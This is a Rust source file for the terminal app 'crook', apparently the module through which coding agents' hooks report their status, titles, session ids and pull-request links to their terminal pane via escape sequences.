//! The command line a program reports itself with.
//!
//! `crook --agent running` writes one escape sequence — the one
//! [`crook_terminal::agent`] reads — to the terminal it was started in, and
//! exits. That is the whole of how an agent reaches the tab it is running in:
//! not a socket, not a file, not a pane id it would have to be told. The
//! terminal it has is the pane, and an OSC written there arrives at the pane's
//! emulator the way its own output does, through `ssh` and out of a container
//! as well as from next door.
//!
//! Its own terminal rather than standard output, because the thing calling
//! it is usually a hook, and a hook's standard output belongs to whoever ran
//! the hook. Claude Code reads what its hooks print; a status printed there
//! would be read as an answer and never reach the screen. A hook often has
//! no terminal of its own either — Claude Code starts each one in a session
//! of its own — and then the pane is the terminal of the program that ran
//! it, which `ancestors` finds one or two processes up on macOS and Linux.
//! Inside tmux the terminal it has is one of tmux's panes, and tmux keeps an
//! OSC it does not know to itself; there `tmux` asks tmux for the terminals
//! of its clients, the Crook pane among them, and the report goes there.
//!
//! `--agent-hooks claude` prints the hooks that make Claude Code say all of
//! this by itself: running when a prompt is sent and while tools run,
//! needing input when it stops to ask — with what it is asking, read out of
//! the notification's own text — idle when it is done, and failed, with the
//! error, when an API error ends the turn instead. What it prints
//! is a fragment of Claude Code's own settings file, to be merged into it by
//! the person whose file it is — Crook does not write a file it does not own,
//! and that one it has never opened. It leads with the other way to the same
//! hooks, which needs no merging: this repository is a Claude Code plugin
//! marketplace (`.claude-plugin/marketplace.json`) whose one plugin,
//! `packaging/claude-code`, carries them and the skill, and installing it is
//! Claude Code writing its own settings. The plugin's hooks are the printed
//! ones, command for command: each calls `"$CROOK_BIN"` — every pane is told
//! its binary — behind a guard that makes it nothing outside Crook, which
//! includes the far side of `ssh` and the inside of a container until
//! `TERM_PROGRAM` is passed on there and a `crook` is on that side's `PATH`
//! or in its `CROOK_BIN`, but lets it through inside any tmux, since only
//! tmux can name the terminals its clients are on and the report goes to
//! each of them, where one that is not Crook drops it unread — and exits 0
//! whatever the report did, because a hook that fails can fail its agent;
//! the tests here hold the plugin's files to what is printed and to
//! [`SKILL`]. `codex`, `gemini` and `copilot` print the same commands under
//! each one's own event names, which is how those three read their hooks
//! too. Codex CLI and GitHub Copilot CLI install the same plugin from the
//! same marketplace, so theirs lead with their own two commands as well:
//! each reads a manifest of its own in the plugin's directory before Claude
//! Code's, and that manifest names a hooks file of its own — what its
//! `--agent-hooks` prints, under its event names, and nothing of Claude
//! Code's. `opencode` has no command hooks and gets the plugin its plugin
//! directory loads instead; `aider` has no hooks, and gets the sentence that
//! says so and what to do instead.
//!
//! The same table is how a window knows an agent when it sees one:
//! [`program_of`] reads a pane's command line for the program an agent is
//! started as, which is the one word of a process the session file keeps, and
//! [`resume_line`] is what a pane restored from that file is offered to bring
//! the agent's conversation back. The program is read past what only runs
//! it — `env`, `npx`, `mise x` — and [`launch_of`] keeps the package runner
//! or version manager an agent was found through, because a resume line has
//! to be run through it as well. The file keeps [`launch_of`]'s answer,
//! which is none for a line that ran the agent in another directory or in
//! some way a resume line would not repeat; [`program_of`] names that agent
//! all the same, since it is the one the pane's title is read for.
//!
//! `--pull-request <url>` beside any status says which pull request the work
//! is, and the row links to it. A flag on the report rather than a report of
//! its own, because the moment an agent has an address to give is a moment
//! it is working — and because the hook that runs after every tool already
//! reports `running`, so `--pull-request -` there finds the address a
//! `gh pr create` printed without a second process after every command.
//! Crook asks no forge for it: the agent just made the pull request, and
//! knows. The same hook, reading the same input, says the question a `Bash`
//! command was asked with is done once the command has run — see
//! `done_from_hook` — since a yes in Claude Code's own dialog tells the
//! question's hook nothing.
//!
//! `--session <id>` says which of the agent's sessions the report is from,
//! and `--session -` reads the id out of the hook's input. A subagent runs in
//! a session of its own, and the pane takes a title or a stop only from the
//! session that holds it — see [`crook_terminal::agent`] — so a subagent's
//! prompt does not rename the tab and its end does not end the agent's turn.
//! Copilot CLI's hooks pass it, because Copilot runs every hook for a
//! subagent as it does for the session the person is talking to.
//! `--session-start <id>` says the same of a session that starts with the
//! report — never a subagent's — and hands it the pane whichever session
//! held it, which is what Copilot's `sessionStart` hook says. The OpenCode
//! plugin tells its subagents apart itself, from the parent a session was
//! made with, and sends nothing for them but their questions.
//!
//! `--skill` prints [`SKILL`], the file that teaches an agent the rest of
//! this: how it tells it is in a pane, what the four words do to the row,
//! and what else the binary will do for it. A hook makes Claude Code report
//! without knowing it is; the skill is for an agent a person has asked to
//! know.
//!
//! `--agent ask claude` is the one that waits for something back. It is a
//! permission hook rather than a report: it hands the window the pane is in
//! the whole of what Claude Code is about to ask a person — over the control
//! socket, since a question read off a pane's output could be forged by
//! anything that prints — and prints what the person said there as the
//! hook's decision, or nothing. It writes to no terminal; the terminal is
//! only how it names its pane. See [`ask`], and [`request`] for the one
//! shape a question is shown in.
//!
//! The same table is what the worktree creator offers to start in a new
//! checkout: which of these agents are installed — [`found_on`], a look in
//! each directory of `PATH`, and in the ones the agents' own installers put
//! them in, for the program, which runs nothing — and the line that starts
//! one on a prompt, [`launch_line`], with the prompt quoted by the host
//! rather than pasted in. An agent found only where its installer put it is
//! started by its path, which a shell finds whatever its `PATH` says. That
//! line is typed into the new pane's composer and left there, unsent,
//! unless the person pressed Start.

use std::fs::OpenOptions;
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

use anyhow::{Context, Result, bail};
use crook_terminal::AgentReport;
use crook_terminal::agent::Session;
use serde_json::{Value, json};

#[cfg(any(target_os = "linux", target_os = "macos"))]
pub(crate) mod ancestors;
pub mod ask;
pub mod request;
#[cfg(any(target_os = "linux", target_os = "macos"))]
mod tmux;

/// The longest title a prompt is cut down to, in characters.
///
/// A tab row is a line, and the first line of a prompt is already the most
/// somebody meant to say about it; this is roughly the width the panel gives
/// a title before it has to cut one itself.
const TITLE_CHARS: usize = 60;

/// What `--skill` prints: a skill file in the Agent Skills format, front
/// matter and body, that teaches a coding agent what it can do from inside
/// a pane.
///
/// A file beside the code rather than a string in it, the way the shell
/// integration keeps its snippets: it is Markdown a person reads whole, and
/// it is what a test pins — every `crook --flag` it names has to be one the
/// parser accepts, so a flag renamed here is a test failing rather than an
/// agent typing something the binary has never heard of.
pub const SKILL: &str = include_str!("skill.md");

/// The longest message a report carries, in characters.
///
/// Longer than a title, because a question is longer than a name and the
/// row's second line has no icon or chips beside it; still one line, since
/// the row is one and the sequence should never carry a novel. A permission
/// prompt's text — "Claude needs your permission to use Bash" — fits with
/// room to spare, and a message cut here still says what was asked.
const MESSAGE_CHARS: usize = 200;

/// Writes `status` to the terminal this process was started in.
///
/// `title` is what the agent calls its work; `Some("-")` reads it out of the
/// hook input on standard input instead, which is how the hooks
/// [`hooks_text`] prints name a prompt without a `jq` on the machine.
/// `message` is what it is waiting for, and `Some("-")` reads that from
/// standard input the same way: a hook's JSON `message` when the input is
/// one, else the input itself, so the same flag serves a hook that hands
/// over JSON and a script that pipes a line.
///
/// `pull_request` is the address of the pull request the work is, written
/// beside the status on a channel of its own — see
/// [`crook_terminal::agent`]. `Some("-")` looks for one in the hook input:
/// the address `gh pr create` printed, when the tool that just ran was one,
/// and nothing otherwise, so the hook after every tool can carry it.
///
/// `session` is the id of the agent's session the report is from, and
/// whether it starts with it; an id of `-` reads it from the hook input:
/// Copilot CLI's `sessionId`, or the `session_id` the other agents hand a
/// hook.
///
/// A `failed` whose hook input is a subagent's is written nowhere, and is no
/// error either: Claude Code runs `StopFailure` for a subagent too, and that
/// failure is not the pane's — see `said_for_a_subagent`.
///
/// With `--pull-request -`, a hook input that says a `Bash` command ran adds
/// the done for the question it may have been asked with, after the status
/// and in the same write — see `done_from_hook` — and one that says a
/// person interrupted the tool writes that done alone, or nothing — see
/// `interrupted_a_tool`.
pub fn report(
    status: &str,
    title: Option<&str>,
    message: Option<&str>,
    pull_request: Option<&str>,
    session: Option<Session<&str>>,
) -> Result<()> {
    let status = AgentReport::parse(status).with_context(|| {
        let words: Vec<_> = AgentReport::ALL.iter().map(|word| word.word()).collect();
        format!("`--agent` takes one of {}, not {status}", words.join(", "))
    })?;
    // Before stdin is read or the terminal opened: an address the row would
    // never show is a mistake the person typing it should hear about, and
    // not a status written without it as though all were well.
    let given = match pull_request {
        None | Some("-") => None,
        Some(url) => Some(given_pull_request(url)?),
    };
    let given_session = match session {
        None | Some(Session::Of("-") | Session::Starts("-")) => None,
        Some(said) => Some(given_session(said)?),
    };

    // Read once, whichever of them asked for it: stdin has one reading in
    // it, and `--title - --message -` would otherwise hand the second an
    // empty string.
    let session_id = session.map(|said| *said.id());
    let input = if [title, message, pull_request, session_id].contains(&Some("-")) {
        let mut input = String::new();
        io::stdin()
            .read_to_string(&mut input)
            .context("`-` reads the hook's input from stdin, and it could not be read")?;
        Some(input)
    } else {
        None
    };
    if status == AgentReport::Failed && input.as_deref().is_some_and(said_for_a_subagent) {
        return Ok(());
    }
    // Only the input `--pull-request -` read: that is the hook after a tool,
    // and the one that knows which tool ran.
    let done = match pull_request {
        Some("-") => input.as_deref().and_then(done_from_hook),
        _ => None,
    };
    let interrupted = input.as_deref().is_some_and(interrupted_a_tool);
    if interrupted && done.is_none() {
        return Ok(());
    }
    let title = match title {
        Some("-") => title_from_hook(input.as_deref().unwrap_or_default()),
        Some(text) => presentable(text),
        None => None,
    };
    let message = match message {
        Some("-") => message_from_hook(input.as_deref().unwrap_or_default()),
        Some(text) => presentable_message(text),
        None => None,
    };
    let pull_request = match pull_request {
        Some("-") => pull_request_from_hook(input.as_deref().unwrap_or_default()),
        _ => given,
    };
    let session = session.and_then(|said| {
        let id = match *said.id() {
            "-" => session_from_hook(input.as_deref().unwrap_or_default()),
            _ => given_session,
        }?;
        Some(said.map(|_| id))
    });

    let mut written = if interrupted {
        String::new()
    } else {
        sequence(
            status,
            title.as_deref(),
            message.as_deref(),
            pull_request.as_deref(),
            session
                .as_ref()
                .map(|said| said.as_ref().map(String::as_str)),
        )
    };
    // After the status, in the same write, so that no hook running beside
    // this one can come between them; the window takes the done in first.
    if let Some(done) = &done {
        written.push_str(&crook_terminal::agent::done_sequence(done));
    }
    // Inside tmux the terminal this has is one of tmux's panes, and tmux keeps
    // the sequence to itself; see `tmux`.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    let written = match tmux::route() {
        None => written,
        Some(tmux::Route::Clients(clients)) if tmux::tell(&clients, &written) => return Ok(()),
        Some(_) => tmux::passthrough(&written),
    };
    let mut terminal = terminal().context(
        "`--agent` writes to the terminal this was run in, and there is none: run it from a pane, or from a hook of a program in one",
    )?;
    terminal
        .write_all(written.as_bytes())
        .and_then(|()| terminal.flush())
        .context("could not write to the terminal")
}

/// Everything one `--agent` writes, in one piece: the status, and the pull
/// request after it when there is one.
///
/// One write rather than two, so that a hook running beside another — Claude
/// Code runs a moment's hooks in parallel — cannot put its own sequence
/// between the two halves of this one.
fn sequence(
    status: AgentReport,
    title: Option<&str>,
    message: Option<&str>,
    pull_request: Option<&str>,
    session: Option<Session<&str>>,
) -> String {
    let mut written = crook_terminal::agent::report(status, title, message, session);
    if let Some(pull_request) = pull_request.and_then(crook_terminal::agent::pull_request) {
        written.push_str(&pull_request);
    }
    written
}

/// The question a hook's input says has been answered in Claude Code's own
/// dialog, or `None` when it says nothing about one.
///
/// Claude Code tells a `PermissionRequest` hook nothing when a person says
/// yes in the dialog beside it: the hook holds on, and the window with it,
/// until the turn ends. What does follow a yes is the tool running, and then
/// its `PostToolUse` — or `PostToolUseFailure`, when the tool failed — with
/// the same `tool_input`, byte for byte, as the request had. So the
/// question's fingerprint is computed here from that input exactly as the
/// window computed it from the request ([`request::digest`] over the
/// session, the tool and what [`request::from_claude_bash`] reads), and the
/// window lets go of the question that has it.
///
/// Only for what a question could have been asked about: `Bash`, with a
/// session the wire takes, an input the allowlist reads whole, and not a
/// subagent's, which [`ask`] asks nothing for — a subagent that ran the
/// command its parent is still being asked about would otherwise withdraw
/// the parent's question.
///
/// A tool a person interrupted is said done all the same: it ran, so it was
/// allowed.
fn done_from_hook(input: &str) -> Option<crook_terminal::agent::Fingerprint> {
    let hook: Value = serde_json::from_str(input).ok()?;
    let said = |key: &str| hook.get(key).and_then(Value::as_str);
    if !matches!(
        said("hook_event_name"),
        Some("PostToolUse" | "PostToolUseFailure")
    ) || said("tool_name") != Some("Bash")
    {
        return None;
    }
    match hook.get("agent_id") {
        None | Some(Value::Null) => {}
        Some(Value::String(id)) if id.trim().is_empty() => {}
        Some(_) => return None,
    }
    let session = said("session_id").and_then(crook_terminal::agent::session_id)?;
    let request = request::from_claude_bash(hook.get("tool_input")?)?;
    let tool = crate::control::protocol::AskingAgent::Claude.tool(&request);
    let digest = request::digest(session, tool, &request);
    let fingerprint = crook_terminal::agent::Fingerprint::parse(&request::fingerprint(&digest))
        .expect("a digest's first half in lowercase hex is a fingerprint");
    Some(fingerprint)
}

/// Whether a hook's input is Claude Code's `PostToolUseFailure` for a tool a
/// person interrupted, with Esc, for which [`report`] writes no status.
///
/// An interrupt ends the turn, and Claude Code runs no `Stop` for it; what
/// says the turn is over is the `✳` it draws in the title — see
/// `Workspace::title_reported` — and a `running` arriving after that would
/// keep the row running, breathing, until the next prompt.
fn interrupted_a_tool(input: &str) -> bool {
    serde_json::from_str::<Value>(input).is_ok_and(|hook| {
        hook.get("hook_event_name").and_then(Value::as_str) == Some("PostToolUseFailure")
            && hook.get("is_interrupt") == Some(&Value::Bool(true))
    })
}

/// An address given on the command line, as the wire will take it.
///
/// Its ends trimmed — `--pull-request "$(gh pr create --fill)"` has a newline
/// on it wherever the shell's substitution did not take it off — and nothing
/// else done to it: an address with anything taken out of the middle is a
/// different address, so one the wire would refuse is refused here, with the
/// rule it broke.
fn given_pull_request(url: &str) -> Result<String> {
    let url = url.trim();
    crook_terminal::agent::pull_request_url(url)
        .map(str::to_owned)
        .with_context(|| {
            format!(
                "`--pull-request` takes an https:// address of at most {} bytes, with no \
spaces or control characters, not {url:?}",
                crook_terminal::agent::PULL_REQUEST_BYTES
            )
        })
}

/// A session id given on the command line, as the wire will take it.
///
/// Its ends trimmed, as an address's are, and nothing else done to it: an id
/// with anything taken out of it is another session's, and the pane would
/// take the report for a subagent's. One the wire would refuse is refused
/// here, with the rule it broke and the flag it was given to.
fn given_session(said: Session<&str>) -> Result<String> {
    let flag = if said.starts() {
        "--session-start"
    } else {
        "--session"
    };
    let id = said.id().trim();
    crook_terminal::agent::session_id(id)
        .map(str::to_owned)
        .with_context(|| {
            format!(
                "`{flag}` takes one word of at most {} bytes, with no `;`, spaces or \
control characters, not {id:?}",
                crook_terminal::agent::SESSION_BYTES
            )
        })
}

/// The session a hook's input says the report is from, or `None` when it
/// names none the wire takes.
///
/// GitHub Copilot CLI hands every hook a `sessionId`, and Claude Code, Codex
/// and Gemini CLI a `session_id`; either is read. Input that is not JSON
/// names no session, since a line piped in is somebody's message rather
/// than an id. An id the wire would refuse is no session, and the report
/// goes without one — as every report went before there were sessions —
/// rather than failing the hook.
fn session_from_hook(input: &str) -> Option<String> {
    let hook: Value = serde_json::from_str(input).ok()?;
    ["sessionId", "session_id"]
        .iter()
        .find_map(|key| hook.get(key)?.as_str())
        .and_then(crook_terminal::agent::session_id)
        .map(str::to_owned)
}

/// The pull request a hook's input says was just opened, or the address a
/// script piped in.
///
/// A PostToolUse hook is handed the tool's input and what came back:
/// Claude Code's `tool_response` is an object with `stdout` and `stderr`,
/// Codex's is the text the model saw, and both put the shell command under
/// `tool_input.command`. Only a command that ran `gh pr create` counts, and
/// only an address that names a pull request by number — so `gh pr view`
/// printing one it did not make is not news, and neither is `git push`
/// printing GitHub's offer to make one at `/pull/new/<branch>`. gh prints
/// one such address — on stdout when it made the pull request, on stderr
/// when the branch already had one, and either is the branch's pull request
/// — and the last found is taken. Input that is not JSON is gh's own output piped
/// through — `gh pr create --fill | crook --agent running --pull-request -`
/// — and its last https address is taken.
///
/// Input that is a JSON object serde cannot read is a hook's all the same,
/// and says nothing: read as piped text, its last https word — any link in
/// any tool's output, a `"}}` still on it — would be sent as the pull request
/// without either question above asked of it. That happens: an agent can cut
/// a long output in the middle of a character, and a lone surrogate escape
/// is JSON serde refuses.
fn pull_request_from_hook(input: &str) -> Option<String> {
    let hook = match serde_json::from_str::<Value>(input) {
        Ok(hook) => hook,
        Err(_) if input.trim_start().starts_with('{') => return None,
        Err(_) => return last_address(input, |_| true),
    };
    let command = hook.get("tool_input")?.get("command")?.as_str()?;
    if !opens_a_pull_request(command) {
        return None;
    }
    let mut said = Vec::new();
    texts(hook.get("tool_response")?, &mut said);
    last_address(&said.join("\n"), names_a_pull_request)
}

/// Whether a shell command runs `gh pr create`, or its alias `gh pr new`.
///
/// Read as words, split on white space and on what joins or quotes commands
/// in a shell, so `git push && gh pr create --fill` is one and `gh` named by
/// its path is still `gh`. A mention inside a quoted string counts too; the
/// address in the output is the second thing that has to be there, and a
/// command that only talked about opening a pull request printed none.
fn opens_a_pull_request(command: &str) -> bool {
    let words: Vec<&str> = command
        .split(|character: char| {
            character.is_whitespace()
                || matches!(character, ';' | '&' | '|' | '(' | ')' | '`' | '"' | '\'')
        })
        .filter(|word| !word.is_empty())
        .collect();
    (0..words.len()).any(|at| {
        let program = words[at].rsplit(['/', '\\']).next().unwrap_or_default();
        if !matches!(program, "gh" | "gh.exe") {
            return false;
        }
        // `gh -R owner/repo pr create` and `gh pr --repo owner/repo create`
        // are both the command, and an agent working in a fork writes the
        // repository it means: words that are flags are stepped over, with
        // the value `-R` and `--repo` take after them.
        let mut rest = words[at + 1..].iter().copied();
        let mut next_command = || {
            while let Some(word) = rest.next() {
                if matches!(word, "-R" | "--repo") {
                    rest.next();
                } else if !word.starts_with('-') {
                    return Some(word);
                }
            }
            None
        };
        next_command() == Some("pr") && matches!(next_command(), Some("create" | "new"))
    })
}

/// Every string in `value`, however deep: Claude Code's response is an
/// object of them and Codex's is one, and neither is promised to stay the
/// shape it is.
fn texts<'a>(value: &'a Value, into: &mut Vec<&'a str>) {
    match value {
        Value::String(text) => into.push(text),
        Value::Array(items) => items.iter().for_each(|item| texts(item, into)),
        Value::Object(fields) => fields.values().for_each(|field| texts(field, into)),
        _ => {}
    }
}

/// The last word of `text` that is an address the wire takes and that
/// `keep` accepts.
///
/// A word loses the quotes and brackets prose puts round a link, and a full
/// stop after one, before it is looked at.
fn last_address(text: &str, keep: impl Fn(&str) -> bool) -> Option<String> {
    text.split_whitespace()
        .map(|word| {
            word.trim_matches(|character: char| {
                matches!(
                    character,
                    '"' | '\'' | '<' | '>' | '(' | ')' | '[' | ']' | ',' | '.'
                )
            })
        })
        .filter_map(crook_terminal::agent::pull_request_url)
        .filter(|url| keep(url))
        .last()
        .map(str::to_owned)
}

/// Whether `url` names a pull request by number, the way every forge gh
/// speaks to spells one: `/pull/<digits>`, then the end or a `/`, `?` or `#`.
fn names_a_pull_request(url: &str) -> bool {
    url.rsplit_once("/pull/").is_some_and(|(_, tail)| {
        let number = tail.split(['/', '?', '#']).next().unwrap_or_default();
        !number.is_empty() && number.bytes().all(|byte| byte.is_ascii_digit())
    })
}

/// The terminal this process is attached to, opened for writing.
///
/// Not standard output, which a hook's parent has taken; the controlling
/// terminal, which is the pane. A hook with none of its own is the ordinary
/// case rather than the odd one — Claude Code starts every command hook in a
/// session of its own, where `/dev/tty` is no such device — and the pane is
/// still there one process up, as the terminal of the program that ran the
/// hook, which is where `ancestors::terminal` finds it. A process whose
/// session was started by a program with no terminal — `cron`, a CI runner, a
/// detached service, an agent another agent's Bash tool runs — has nowhere
/// to report to, and says so.
fn terminal() -> io::Result<std::fs::File> {
    #[cfg(unix)]
    let path = "/dev/tty";
    #[cfg(windows)]
    let path = "CONOUT$";
    OpenOptions::new()
        .write(true)
        .open(path)
        .or_else(an_ancestors_terminal)
}

/// The terminal of the program that started this process's session, for a
/// process that could not open its own; `error` when that program has none.
///
/// `error` is what opening its own said, and it is kept because when that
/// program has no terminal either, "no such device" is still what went wrong.
/// Only macOS and Linux are walked; anywhere else it is always the error.
fn an_ancestors_terminal(error: io::Error) -> io::Result<std::fs::File> {
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    if let Some(terminal) = ancestors::terminal() {
        return terminal;
    }
    Err(error)
}

/// The title a hook's input names: the first line of its `prompt`, cut to
/// a row's width.
///
/// Claude Code hands every hook a JSON object on standard input, and the one
/// for a prompt being sent carries the prompt under `prompt`; Copilot CLI's
/// `sessionStart` carries the prompt that started the session under
/// `initialPrompt`. Anything else — no JSON, no such field, an empty line —
/// is no title, and the status goes without one rather than with one that
/// says `{`.
///
/// Nor is a prompt Copilot wrote itself. When a background subagent
/// finishes it hands the agent a [`SYSTEM_NOTIFICATION`] through the same
/// `userPromptSubmitted` as a person's prompt, and its first line named the
/// tab `<system_notification>`. The report still says the agent is running
/// again, which it is.
fn title_from_hook(input: &str) -> Option<String> {
    let parsed: Value = serde_json::from_str(input).ok()?;
    let prompt = ["prompt", "initialPrompt"]
        .iter()
        .find_map(|key| parsed.get(key)?.as_str())?;
    if prompt.trim_start().starts_with(SYSTEM_NOTIFICATION) {
        return None;
    }
    prompt.lines().find_map(presentable)
}

/// How a prompt Copilot CLI writes to its agent begins, as captured from
/// 1.0.89: `<system_notification>`, then a line saying what finished —
/// `Agent "sub" (task) has finished processing and is now idle.` — and the
/// closing tag.
const SYSTEM_NOTIFICATION: &str = "<system_notification>";

/// Whether a hook's input is one Claude Code ran for a subagent: it puts the
/// subagent's `agent_id` in the input of every hook it runs for one, and
/// leaves it out for the main thread, a session started with `--agent`
/// included.
///
/// [`report`] asks it of a failure and of nothing else. Claude Code runs
/// `StopFailure` for a subagent whose turn an API error ended as it does for
/// its own, and that failure is not the pane's: the agent that started the
/// subagent is handed the error as a tool's result and works on. Said on the
/// row it would turn it red, post a notice and tell a lead the worker had
/// stopped while the worker carried on — and a background agent's, after the
/// turn had ended, would leave the row red until the next prompt. A subagent
/// at work is the pane at work, though, so its tools' `running` stands.
fn said_for_a_subagent(input: &str) -> bool {
    serde_json::from_str::<Value>(input).is_ok_and(|parsed| {
        parsed
            .get("agent_id")
            .and_then(Value::as_str)
            .is_some_and(|agent| !agent.trim().is_empty())
    })
}

/// The message on standard input: a hook's `message`, else the error that
/// ended a turn, else the tool a permission request names, else the input
/// itself.
///
/// Claude Code's Notification hook is handed a JSON object whose `message`
/// is the notification's text — "Claude needs your permission to use Bash"
/// — which is exactly what the row wants to say. Its StopFailure hook has no
/// `message`: what it shows the person is `last_assistant_message`, the
/// error as a sentence — "You've hit your limit · resets 5pm" — and `error`
/// is the kind, `rate_limit` or `overloaded`, which is all that is left to
/// say when the sentence is missing. Codex's PermissionRequest hook is
/// handed the tool and its input and no text, so the row says which tool.
/// Input that is not JSON is taken whole, so `echo "approve the
/// deploy?" | crook --agent needs-input --message -` works from a script
/// with no JSON to hand; JSON with none of these is not a message, and the
/// status goes without one rather than with a line of braces.
fn message_from_hook(input: &str) -> Option<String> {
    let Ok(parsed) = serde_json::from_str::<Value>(input) else {
        return presentable_message(input);
    };
    ["message", "last_assistant_message", "error"]
        .into_iter()
        .find_map(|field| presentable_message(parsed.get(field)?.as_str()?))
        .or_else(|| {
            let tool = parsed.get("tool_name")?.as_str()?;
            presentable_message(&format!("permission to use {tool}"))
        })
}

/// `text` as a row can print it, or `None` when nothing of it can be.
///
/// A control character becomes a space and a run of spaces becomes one, then
/// the ends are trimmed and the line is cut to a row's width. The wire drops
/// a title that still holds a control character — see
/// [`crook_terminal::agent::report`] — and it used to receive one straight
/// from the command line or a prompt, so a tab in a pasted prompt, which is
/// the ordinary way a prompt holds one, cost the whole title.
fn presentable(text: &str) -> Option<String> {
    one_line(text, TITLE_CHARS)
}

/// [`presentable`] at a message's length.
///
/// The same cleaning: a notification's text is one line already, and a
/// script's may not be, and either way the row has one line to put it on.
fn presentable_message(text: &str) -> Option<String> {
    one_line(text, MESSAGE_CHARS)
}

/// `text` as one line of at most `chars` characters, with a mark where it
/// was cut.
pub(crate) fn one_line(text: &str, chars: usize) -> Option<String> {
    let mut line = String::with_capacity(text.len());
    let mut space = true;
    for character in text.chars() {
        if character.is_control() || character.is_whitespace() {
            if !space {
                line.push(' ');
                space = true;
            }
        } else {
            line.push(character);
            space = false;
        }
    }
    let line = line.trim_end();
    if line.is_empty() {
        return None;
    }
    let mut cut: String = line.chars().take(chars).collect();
    if line.chars().count() > chars {
        cut.push('…');
    }
    Some(cut)
}

/// What `--agent-hooks` prints for one agent.
#[derive(Debug, PartialEq, Eq)]
pub struct Hooks {
    /// The lead, for standard error before the fragment: the commands that
    /// install Crook's plugin for the agent, which carries the same hooks,
    /// so the fragment after it is for a person who would rather set them up
    /// by hand. `None` for an agent Crook ships no plugin for.
    pub lead: Option<String>,
    /// The fragment, for standard output: a settings file's `hooks` object,
    /// a plugin file, or — for an agent with no hooks — the sentence that
    /// says so and what to do instead.
    pub text: String,
    /// The note, for standard error: where the fragment goes, and what the
    /// agent's mechanism cannot report. `None` when the text is the sentence
    /// and says it all.
    pub note: Option<String>,
}

/// One coding agent `--agent-hooks` knows.
struct Agent {
    /// The word on the command line, which is also the program's own file
    /// name — `claude` is both what `--agent-hooks` takes and what a person
    /// types to start Claude Code, and [`program_of`] reads a pane's command
    /// line by it.
    name: &'static str,
    /// What the program calls itself.
    program: &'static str,
    /// The npm package the agent is published as, which a package runner —
    /// `npx @google/gemini-cli` — is handed in the program's place, or
    /// `None` for one that is not published there: aider is a Python
    /// package.
    package: Option<&'static str>,
    /// How the fragment is spelled, and where it goes.
    fragment: Fragment,
    /// The option a first prompt goes after when the agent is started on one,
    /// or `None` for an agent that takes it as its first word.
    ///
    /// The one that keeps the session open afterwards, never the one-shot
    /// kind: a task is started so that somebody can go on talking to it.
    /// Gemini CLI's and Copilot CLI's bare prompts are both one-shot, so the
    /// option is their `-i`. aider has no way to open a chat on a prompt, and
    /// its `--message` — do this one thing and exit — is the nearest.
    prompt_flag: Option<&'static str>,
    /// The commands that install Crook's own plugin for this agent, which
    /// carries the fragment's hooks; empty when there is none.
    plugin: &'static [&'static str],
    /// The line that goes back to the most recent conversation in the
    /// directory it is run in, when the agent has one — see [`resume_line`].
    last: Option<&'static str>,
    /// The line that lists the agent's conversations for a person to choose
    /// from, when the agent has one.
    pick: Option<&'static str>,
}

/// Which of an agent's two resume lines a restored pane is offered.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Resume {
    /// The most recent conversation in the pane's directory: `claude
    /// --continue`. What a pane is offered when it is the only one of its
    /// agent in its directory, which Crook's one-agent-per-worktree makes the
    /// ordinary case.
    Last,
    /// The agent's own list to choose from: `claude --resume`. What two panes
    /// of one agent in one directory are offered instead, because "the most
    /// recent conversation" is one conversation and they had two, and
    /// guessing which pane had which would put one agent's work in the
    /// other's pane.
    Pick,
}

/// The shapes a fragment comes in.
///
/// One per mechanism rather than one per agent: Codex and Gemini CLI read
/// the same `hooks` object Claude Code does, with their own event names, so
/// their fragments differ from Claude's only in the table of events.
enum Fragment {
    /// Claude Code's `hooks` object: an event name over a list of matchers,
    /// each with a list of commands run with the event's JSON on stdin.
    Hooks {
        /// The file the object is merged into.
        file: &'static str,
        /// Each event and the `--agent` arguments its hook runs.
        events: &'static [(&'static str, &'static str)],
        /// What the events cannot say, for the note.
        missing: &'static str,
        /// What the agent asks of the person before it runs hooks merged
        /// into its file, for a line of its own; empty when it asks nothing.
        trust: &'static str,
        /// What the agent can be set to say with none of these hooks, for a
        /// line of its own at the end of the note; empty when nothing.
        without: &'static str,
    },
    /// GitHub Copilot CLI's shape: a `version`, and `bash` for the command,
    /// with a `powershell` beside it that this fragment leaves out.
    Copilot {
        /// The file the object is saved as.
        file: &'static str,
        /// Each event and the `--agent` arguments its hook runs.
        events: &'static [(&'static str, &'static str)],
    },
    /// A plugin file, for an agent with no hooks in its settings and a
    /// directory of TypeScript it loads at startup.
    Plugin {
        /// The file the plugin is saved as.
        file: &'static str,
        /// The plugin, with `BINARY` where the binary's path goes as a
        /// string literal.
        source: &'static str,
    },
    /// No hooks: the text is a sentence saying so and what to do instead.
    None(&'static str),
}

/// The Claude Code hooks: running on a prompt and around every tool,
/// needing input on every notification, idle on stop, failed on a stop an
/// API error forced.
///
/// The prompt is the one moment the work has a name. Before a tool as well
/// as after it: a permission prompt comes between the two, and only the
/// second says it was answered. Every notification Claude Code sends is one
/// that wants a person — a permission to give, a question to answer, a long
/// idle at its prompt — and its text says which, so the row says it.
///
/// Not `PermissionRequest`, though Claude Code runs it as a permission
/// dialog opens, six seconds before the notification that asks. It runs the
/// same hook where there is no dialog and nobody to answer one — in `claude
/// -p` with no prompt tool, and for a background agent — just before it
/// refuses the tool, which would turn a worker's row amber over a question
/// nobody was asked. And no hook says the dialog was answered until the
/// tool is done, so a command the person allowed would wait out its whole
/// run on an amber row. What the row needs at that moment it has without
/// it: the `✳` Claude Code draws as the dialog opens takes the running back
/// — see `Workspace::title_reported` — and the notification says the rest.
///
/// A turn an API error ends runs no `Stop`. It runs `StopFailure` instead,
/// and its input carries the error as Claude Code showed it — a usage limit
/// and when it resets, an overload, a login gone stale — which the row says
/// beside `failed`. Failed rather than idle, a usage limit included: the
/// work stopped short and a person has to do something about it, wait,
/// log in or try again, and an idle would tell `crook pane wait --until
/// idle` that it was done. A subagent's turn runs the same hook, with its
/// `agent_id` in the input, and that failure is not the pane's: the agent
/// that started it is handed the error and works on, so [`report`] says
/// nothing for it — see [`said_for_a_subagent`]. A turn Esc interrupts runs
/// neither, nor any hook at all; the title's `✳` is what says that one is
/// over — see `Workspace::title_reported`.
///
/// The hook after a tool is also where a pull request is noticed: handed the
/// tool's input, it finds the address a `gh pr create` printed and sends it
/// beside the status — see [`pull_request_from_hook`] — and finds nothing
/// after any other tool. That hook rather than a second one matched to
/// `Bash`, because a second would be a second process after every shell
/// command the agent runs, to report a `running` the first already had.
///
